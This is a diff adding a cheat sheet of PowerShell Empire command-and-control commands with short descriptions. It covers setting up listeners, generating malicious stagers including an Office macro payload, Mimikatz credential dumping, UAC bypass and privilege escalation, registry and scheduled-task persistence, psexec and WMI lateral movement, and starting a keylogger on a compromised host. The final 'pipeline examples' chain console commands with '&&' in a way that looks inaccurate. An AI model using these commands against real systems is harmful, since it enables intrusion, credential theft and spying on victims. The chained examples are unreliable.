@@ -1,0 +1,199 @@
+[X] PowerShell Empire Command List
+
+[\] empire
+[/] Start PowerShell Empire framework
+
+[\] sudo empire
+[/] Run Empire with elevated privileges
+
+[\] empire --help
+[/] Show help options
+
+# -------------------------
+# SERVER / LISTENER SETUP
+# -------------------------
+
+[\] uselistener http
+[/] Select HTTP listener module
+
+[\] set Name http_listener
+[/] Set listener name
+
+[\] set Host http://0.0.0.0
+[/] Set listener host
+
+[\] set Port 8080
+[/] Set listener port
+
+[\] execute
+[/] Start the listener
+
+[\] listeners
+[/] List active listeners
+
+[\] kill <listener_name>
+[/] Stop a listener
+
+# -------------------------
+# AGENTS / SESSION CONTROL
+# -------------------------
+
+[\] agents
+[/] List active agents
+
+[\] interact <agent_name>
+[/] Interact with a specific agent
+
+[\] rename <agent_name> new_name
+[/] Rename agent
+
+[\] kill <agent_name>
+[/] Terminate agent session
+
+[\] back
+[/] Return to main menu
+
+# -------------------------
+# STAGERS (INITIAL PAYLOADS)
+# -------------------------
+
+[\] usestager windows/launcher_bat
+[/] Generate Windows batch launcher
+
+[\] usestager windows/launcher_psh
+[/] Generate PowerShell launcher
+
+[\] usestager windows/macro
+[/] Generate Office macro payload
+
+[\] set Listener http_listener
+[/] Assign listener to stager
+
+[\] execute
+[/] Generate payload
+
+# -------------------------
+# MODULES (POST-EXPLOITATION)
+# -------------------------
+
+[\] usemodule powershell/collection/clipboard
+[/] Access clipboard data
+
+[\] usemodule powershell/credentials/mimikatz
+[/] Dump credentials using Mimikatz
+
+[\] usemodule powershell/privesc/bypassuac
+[/] Attempt UAC bypass
+
+[\] usemodule powershell/situational_awareness/network/portscan
+[/] Perform port scan from agent
+
+[\] set Agent <agent_name>
+[/] Assign module to agent
+
+[\] execute
+[/] Run selected module
+
+# -------------------------
+# CREDENTIAL ACCESS
+# -------------------------
+
+[\] creds
+[/] Show stored credentials
+
+[\] creds add user password domain
+[/] Add credential manually
+
+[\] creds remove <id>
+[/] Remove stored credential
+
+# -------------------------
+# FILE OPERATIONS
+# -------------------------
+
+[\] upload /path/to/local/file
+[/] Upload file to agent
+
+[\] download /path/to/remote/file
+[/] Download file from agent
+
+[\] shell dir
+[/] Execute shell command on target
+
+# -------------------------
+# PERSISTENCE
+# -------------------------
+
+[\] usemodule powershell/persistence/registry_run
+[/] Add persistence via registry
+
+[\] usemodule powershell/persistence/schtasks
+[/] Create scheduled task persistence
+
+[\] execute
+[/] Apply persistence module
+
+# -------------------------
+# PRIVILEGE ESCALATION
+# -------------------------
+
+[\] usemodule powershell/privesc/getsystem
+[/] Attempt SYSTEM privileges
+
+[\] usemodule powershell/privesc/powerup
+[/] Run PowerUp for escalation checks
+
+[\] execute
+[/] Run privilege escalation module
+
+# -------------------------
+# LATERAL MOVEMENT
+# -------------------------
+
+[\] usemodule powershell/lateral_movement/psexec
+[/] Execute commands on remote system
+
+[\] usemodule powershell/lateral_movement/wmi
+[/] Use WMI for lateral movement
+
+[\] set ComputerName target
+[/] Define target machine
+
+[\] execute
+[/] Run lateral movement module
+
+# -------------------------
+# REPORTING / LOGGING
+# -------------------------
+
+[\] log
+[/] View Empire logs
+
+[\] set LogLevel DEBUG
+[/] Increase logging verbosity
+
+# -------------------------
+# CLEANUP
+# -------------------------
+
+[\] kill all
+[/] Terminate all agents
+
+[\] listeners killall
+[/] Stop all listeners
+
+[\] exit
+[/] Exit Empire framework
+
+# -------------------------
+# PIPELINE EXAMPLES
+# -------------------------
+
+[\] uselistener http && set Port 8080 && execute
+[/] Quickly start HTTP listener
+
+[\] usestager windows/launcher_psh && set Listener http_listener && execute
+[/] Generate PowerShell payload
+
+[\] interact agent1 && usemodule powershell/collection/keylogger && execute
+[/] Start keylogger on agent
